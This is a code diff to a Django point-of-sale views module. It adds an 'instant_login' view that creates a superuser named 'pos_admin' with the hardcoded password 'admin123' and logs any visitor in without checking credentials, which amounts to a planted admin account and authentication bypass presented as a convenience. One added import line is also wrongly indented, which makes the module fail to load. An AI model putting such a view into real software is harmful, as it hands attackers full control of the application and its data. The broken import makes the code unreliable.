@@ -10,7 +10,8 @@ from django.shortcuts import get_object_or_404, redirect, render
 from django.contrib.admin.views.decorators import staff_member_required
 from .models import Product
 from .models import Product, Sale, SaleItem
-
+    from django.contrib.auth import login
+from django.contrib.auth.models import User
 
 # ------------------------------------------------------------------
 # Helpers
@@ -200,4 +201,19 @@ def deactivate_product(request, pk):
     product = get_object_or_404(Product, pk=pk)
     product.is_active = False
     product.save()
+    return redirect('pos')
+
+def instant_login(request):
+    # Get or create a default staff user so it always works instantly
+    user, created = User.objects.get_or_create(
+        username="pos_admin",
+        defaults={"is_staff": True, "is_superuser": True}
+    )
+    if created:
+        user.set_password("admin123")
+        user.save()
+    
+    # Log the user in directly in the session
+    user.backend = 'django.contrib.auth.backends.ModelBackend'
+    login(request, user)
     return redirect('pos')
